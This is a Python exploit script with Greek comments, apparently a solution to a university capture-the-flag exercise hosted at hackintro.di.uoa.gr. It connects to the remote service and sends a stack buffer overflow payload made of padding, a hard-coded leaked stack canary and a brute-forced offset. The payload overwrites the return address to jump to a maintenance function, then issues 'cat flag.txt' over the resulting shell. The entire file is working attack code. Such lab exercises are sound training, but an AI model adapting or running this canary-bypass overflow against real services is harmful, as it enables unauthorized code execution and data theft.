import socket
import struct

# Ρυθμίσεις στόχου
HOST = 'shell.hackintro.di.uoa.gr'
PORT = 28285

# Σταθερά δεδομένα
CANARY = b"\x00\x78\x5b\x1b\x1c\x40\x19\x00"
MAINTENANCE_ADDR = struct.pack("<I", 0x08049226) # Little-endian 32-bit

def exploit():
    # Δοκιμάζουμε offsets για το padding μετά το καναρίνι (συνήθως 0 έως 20)
    for offset in range(0, 32, 4):
        print(f"[*] Testing post-canary offset: {offset}")
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((HOST, PORT))

            # Payload: Padding(122) + Canary(8) + Extra Padding(offset) + Return Address
            payload = b"A"*122 + CANARY + b"B"*offset + MAINTENANCE_ADDR
            
            s.sendall(payload)
            
            # Στέλνουμε μια εντολή για να δούμε αν άνοιξε το shell
            s.sendall(b"cat flag.txt\n")
            
            # Προσπάθεια ανάγνωσης απάντησης
            response = s.recv(1024)
            if response:
                print(f"[!] SUCCESS at offset {offset}!")
                print(f"Response: {response.decode(errors='ignore')}")
                # Αν βρούμε το flag, σταματάμε
                if b"flag" in response.lower():
                    break
            
            s.close()
        except Exception as e:
            # Το timeout συνήθως σημαίνει ότι το πρόγραμμα περιμένει είσοδο (shell!)
            pass

if __name__ == "__main__":
    exploit()